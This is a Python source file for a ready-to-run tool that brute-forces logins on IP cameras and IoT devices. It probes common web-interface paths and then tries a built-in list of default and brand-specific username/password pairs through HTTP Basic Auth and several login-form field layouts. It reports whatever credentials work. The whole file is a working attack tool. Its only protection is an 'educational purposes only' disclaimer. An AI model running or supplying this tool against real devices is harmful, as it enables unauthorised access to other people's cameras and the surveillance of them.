#!/usr/bin/env python3
"""
Camera/IoT Device Brute Force Tool
Specialized tool for testing IP cameras and IoT devices
Educational purposes only - use responsibly on devices you own or have permission to test.
"""

import requests
import time
import argparse
from urllib.parse import urljoin, urlparse
import base64
from concurrent.futures import ThreadPoolExecutor
import threading
from advanced_bruteforce import AdvancedLoginTester, save_results

class CameraBruteForcer:
    def __init__(self, target_url, delay=1, timeout=10):
        self.target_url = target_url.rstrip('/')
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.successful_logins = []
        self.failed_attempts = 0
        self.total_attempts = 0
        self.lock = threading.Lock()
        
        # Common camera/IoT paths
        self.common_paths = [
            '/',
            '/login.html',
            '/login.htm',
            '/index.html',
            '/index.htm',
            '/admin.html',
            '/admin.htm',
            '/cgi-bin/main-cgi',
            '/web/index.html',
            '/viewer/live/index.html',
            '/LiveView.html',
            '/view/index.shtml',
            '/home.html',
            '/main.html'
        ]
        
        # Setup session
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
    
    def load_camera_credentials(self):
        """Load camera-specific credentials from file"""
        credentials = []
        
        try:
            with open('camera_credentials.txt', 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if ':' in line:
                            username, password = line.split(':', 1)
                            credentials.append((username, password))
        except FileNotFoundError:
            print("camera_credentials.txt not found, using built-in credentials")
        
        # Add built-in camera credentials
        builtin_credentials = [
            # Basic admin credentials
            ('admin', '123456'),
            ('Admin', '123456'),
            ('admin', 'admin'),
            ('Admin', 'Admin'),
            ('admin', '9999'),
            ('admin', '1234'),
            ('Admin', '1234'),
            ('admin', '12345'),
            ('Admin', '12345'),
            ('administrator', ''),
            ('Administrator', 'Administrator'),
            ('root', 'pass'),
            ('Root', 'Pass'),
            ('admin', 'flir'),
            ('admin', 'fliradmin'),
            ('Admin', 'Flir'),
            ('Admin', 'Fliradmin'),
            ('root', 'camera'),
            ('Root', 'Camera'),
            ('admin', 'jvc'),
            ('Admin', 'JVC'),
            ('admin', 'meinsm'),
            ('Admin', 'Meinsm'),
            ('root', 'root'),
            ('Root', 'Root'),
            ('admin', '4321'),
            ('Admin', '4321'),
            ('admin', '1111111'),
            ('Admin', '1111111'),
            ('admin', 'password'),
            ('Admin', 'Password'),
            ('supervisor', 'supervisor'),
            ('Supervisor', 'Supervisor'),
            ('ubnt', 'ubnt'),
            ('Ubnt', 'Ubnt'),
            ('root', 'system'),
            ('Root', 'System'),
            ('root', 'admin'),
            ('Root', 'Admin'),
            ('admin', '123'),
            ('Admin', '123'),
            ('admin', '0000'),
            ('Admin', '0000'),
            ('admin', ''),
            ('admin', 'wbox123'),
            ('admin', 'ikwd'),
            ('admin', 'ikwb'),
            ('root', 'ikwd'),
            ('root', 'ikwb'),
            ('admin', '999'),
            ('Admin', '999'),
            ('admin', 'abcd'),
            ('Admin', 'ABCD'),
            ('admin', '1'),
            ('Admin', '1'),
            ('admin', '12345678'),
            ('admin', 'admin123'),
            ('admin', 'admin1'),
            ('root', ''),
            ('Root', ''),
            
            # Brand-specific credentials
            ('service', 'service'),
            ('Dinion', ''),
            ('888888', '888888'),
            ('666666', '666666'),
            ('administrator', '1234'),
            ('admin1', 'password'),
            ('admin', '1111'),
            ('admin', 'pass'),
            
            # Generic fallbacks
            ('user', 'user'),
            ('guest', 'guest'),
            ('viewer', 'viewer'),
            ('operator', 'operator'),
            ('default', 'default'),
            ('camera', 'camera'),
            ('ftp', 'ftp'),
            ('test', 'test')
        ]
        
        # Combine and deduplicate
        all_credentials = credentials + builtin_credentials
        unique_credentials = list(set(all_credentials))
        
        return unique_credentials
    
    def test_http_basic_auth(self, username, password):
        """Test HTTP Basic Authentication"""
        try:
            # Create basic auth header
            credentials = f"{username}:{password}"
            encoded_credentials = base64.b64encode(credentials.encode()).decode()
            
            headers = self.session.headers.copy()
            headers['Authorization'] = f'Basic {encoded_credentials}'
            
            response = self.session.get(
                self.target_url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            with self.lock:
                self.total_attempts += 1
            
            # Check for success
            success = self.check_auth_success(response, username, password)
            
            result = {
                'username': username,
                'password': password,
                'method': 'HTTP Basic Auth',
                'status_code': response.status_code,
                'success': success,
                'response_length': len(response.text),
                'auth_header': response.headers.get('WWW-Authenticate', ''),
                'response_time': response.elapsed.total_seconds()
            }
            
            if success:
                with self.lock:
                    self.successful_logins.append(result)
            else:
                with self.lock:
                    self.failed_attempts += 1
            
            return result
            
        except Exception as e:
            with self.lock:
                self.total_attempts += 1
                self.failed_attempts += 1
            
            return {
                'username': username,
                'password': password,
                'method': 'HTTP Basic Auth',
                'error': str(e),
                'success': False
            }
    
    def test_form_login(self, username, password, login_path):
        """Test form-based login"""
        try:
            login_url = urljoin(self.target_url, login_path)
            
            # Get login page first
            response = self.session.get(login_url, timeout=self.timeout)
            
            # Common form field combinations for cameras
            form_combinations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'login': username, 'passwd': password},
                {'userid': username, 'pwd': password},
                {'name': username, 'password': password},
                {'admin': username, 'admin_pwd': password},
                {'user_name': username, 'user_pwd': password}
            ]
            
            for form_data in form_combinations:
                try:
                    login_response = self.session.post(
                        login_url,
                        data=form_data,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    with self.lock:
                        self.total_attempts += 1
                    
                    success = self.check_form_success(login_response, username, password)
                    
                    if success:
                        result = {
                            'username': username,
                            'password': password,
                            'method': f'Form Login ({login_path})',
                            'status_code': login_response.status_code,
                            'success': True,
                            'form_data': form_data,
                            'response_time': login_response.elapsed.total_seconds()
                        }
                        
                        with self.lock:
                            self.successful_logins.append(result)
                        
                        return result
                    
                except Exception:
                    continue
            
            # If we get here, all form attempts failed
            with self.lock:
                self.failed_attempts += 1
            
            return {
                'username': username,
                'password': password,
                'method': f'Form Login ({login_path})',
                'success': False
            }
            
        except Exception as e:
            with self.lock:
                self.total_attempts += 1
                self.failed_attempts += 1
            
            return {
                'username': username,
                'password': password,
                'method': f'Form Login ({login_path})',
                'error': str(e),
                'success': False
            }
    
    def check_auth_success(self, response, username, password):
        """Check if HTTP Basic Auth was successful"""
        status_code = response.status_code
        content = response.text.lower()
        
        # Success indicators
        if status_code == 200:
            # Check for camera-specific success indicators
            success_indicators = [
                'live view', 'camera', 'video', 'stream', 'snapshot',
                'configuration', 'settings', 'admin', 'control panel',
                'device info', 'system info', 'network', 'recording',
                'playback', 'motion detection', 'alarm'
            ]
            
            if any(indicator in content for indicator in success_indicators):
                return True
        
        # Failure indicators
        if status_code == 401:
            return False
        
        # Check for login forms (might indicate auth bypass)
        if 'password' in content and 'login' in content:
            return False
        
        # Default to success for 200 status
        return status_code == 200
    
    def check_form_success(self, response, username, password):
        """Check if form login was successful"""
        status_code = response.status_code
        content = response.text.lower()
        
        # Redirect often indicates success
        if status_code in [301, 302, 303, 307, 308]:
            return True
        
        # Success keywords
        success_indicators = [
            'welcome', 'dashboard', 'main menu', 'live view',
            'camera control', 'system', 'logout', 'admin panel'
        ]
        
        # Failure keywords
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'wrong password', 'authentication failed', 'login failed'
        ]
        
        if any(indicator in content for indicator in success_indicators):
            return True
        
        if any(indicator in content for indicator in failure_indicators):
            return False
        
        # Default to success for 200 status without failure indicators
        return status_code == 200 and not any(fail in content for fail in failure_indicators)
    
    def discover_camera_interface(self):
        """Discover camera web interface and login methods"""
        print(f"Discovering camera interface at {self.target_url}")
        
        discovered_paths = []
        auth_methods = []
        
        for path in self.common_paths:
            try:
                url = urljoin(self.target_url, path)
                response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    content = response.text.lower()
                    if any(keyword in content for keyword in ['camera', 'video', 'stream', 'live']):
                        discovered_paths.append(path)
                        print(f"Found camera interface: {path}")
                
                elif response.status_code == 401:
                    auth_header = response.headers.get('WWW-Authenticate', '')
                    if 'basic' in auth_header.lower():
                        auth_methods.append('HTTP Basic Auth')
                        print(f"Found HTTP Basic Auth at: {path}")
                
            except Exception:
                continue
        
        return discovered_paths, auth_methods
    
    def run_camera_attack(self, credentials):
        """Run brute force attack against camera"""
        print(f"Starting camera brute force attack")
        print(f"Target: {self.target_url}")
        print(f"Credentials to test: {len(credentials)}")
        print(f"Delay: {self.delay} seconds")
        print("-" * 60)
        
        # Discover interface first
        paths, auth_methods = self.discover_camera_interface()
        
        # Test HTTP Basic Auth first (most common for cameras)
        if 'HTTP Basic Auth' in auth_methods or not paths:
            print("Testing HTTP Basic Authentication...")
            for username, password in credentials:
                result = self.test_http_basic_auth(username, password)
                self.print_result(result)
                time.sleep(self.delay)
                
                if result['success']:
                    print(f"🎯 SUCCESS! Found working credentials: {username}:{password}")
        
        # Test form-based login if paths were discovered
        if paths:
            print("Testing form-based authentication...")
            for path in paths:
                for username, password in credentials:
                    result = self.test_form_login(username, password, path)
                    if result.get('success'):
                        self.print_result(result)
                        print(f"🎯 SUCCESS! Found working credentials: {username}:{password}")
                    time.sleep(self.delay)
    
    def print_result(self, result):
        """Print formatted result"""
        if 'error' in result:
            print(f"[ERROR] {result['username']}:{result['password']} - {result['error']}")
        elif result['success']:
            print(f"[SUCCESS] {result['username']}:{result['password']} - {result['method']} - Status: {result.get('status_code', 'N/A')}")
        else:
            print(f"[FAILED] {result['username']}:{result['password']} - {result['method']}")

def main():
    parser = argparse.ArgumentParser(description='Camera/IoT Device Brute Force Tool')
    parser.add_argument('url', help='Target camera/device URL (e.g., http://192.168.1.100)')
    parser.add_argument('-d', '--delay', type=float, default=2.0,
                       help='Delay between requests (seconds, default: 2.0)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds')
    parser.add_argument('-c', '--credentials', help='Custom credentials file (username:password per line)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('--discover-only', action='store_true',
                       help='Only discover camera interface, don\'t attack')
    
    args = parser.parse_args()
    
    # Validate URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme:
        args.url = 'http://' + args.url
    
    print("🎥 Camera/IoT Device Brute Force Tool")
    print("=" * 50)
    print("⚠️  Educational purposes only!")
    print("⚠️  Use only on devices you own or have permission to test!")
    print("=" * 50)
    
    # Initialize brute forcer
    bruter = CameraBruteForcer(args.url, args.delay, args.timeout)
    
    if args.discover_only:
        bruter.discover_camera_interface()
        return
    
    # Load credentials
    if args.credentials:
        credentials = []
        try:
            with open(args.credentials, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username, password))
        except FileNotFoundError:
            print(f"Credentials file {args.credentials} not found")
            return
    else:
        credentials = bruter.load_camera_credentials()
    
    print(f"Loaded {len(credentials)} credential pairs")
    
    try:
        bruter.run_camera_attack(credentials)
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    
    # Print results
    print("\n" + "=" * 60)
    print("CAMERA ATTACK RESULTS")
    print("=" * 60)
    print(f"Total attempts: {bruter.total_attempts}")
    print(f"Failed attempts: {bruter.failed_attempts}")
    print(f"Successful logins: {len(bruter.successful_logins)}")
    
    if bruter.successful_logins:
        print("\n🎯 SUCCESSFUL CAMERA CREDENTIALS:")
        for login in bruter.successful_logins:
            print(f"  ✓ {login['username']}:{login['password']} ({login['method']})")
            if login.get('response_time'):
                print(f"    Response time: {login['response_time']:.2f}s")
    else:
        print("\n❌ No successful logins found")
        print("Try:")
        print("  - Checking if the device is actually a camera/IoT device")
        print("  - Verifying the URL is correct")
        print("  - Using --discover-only to see available interfaces")
    
    # Save results
    if args.output:
        save_results(bruter, args.output)

if __name__ == "__main__":
    main()